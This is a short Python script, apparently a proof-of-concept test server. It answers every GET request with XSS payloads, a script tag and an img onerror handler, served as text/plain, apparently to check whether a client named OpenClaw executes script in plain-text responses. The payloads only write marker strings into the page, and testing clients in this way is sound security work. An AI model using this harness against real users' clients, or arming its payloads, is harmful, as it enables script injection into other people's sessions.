from http.server import HTTPServer, BaseHTTPRequestHandler
import os


PAYLOAD = """
<script>
document.body.innerHTML="OPENCLAW_XSS_EXECUTED";
</script>

<img src=x onerror="document.body.innerHTML='IMG_XSS_EXECUTED'">
"""


class Handler(BaseHTTPRequestHandler):

    def do_GET(self):
        self.send_response(200)

        # Important: text/plain
        self.send_header("Content-Type", "text/plain")

        self.end_headers()

        self.wfile.write(PAYLOAD.encode())


    def do_HEAD(self):
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.end_headers()


port = int(os.environ.get("PORT", 8080))

server = HTTPServer(("0.0.0.0", port), Handler)

print(f"Running on {port}")

server.serve_forever()
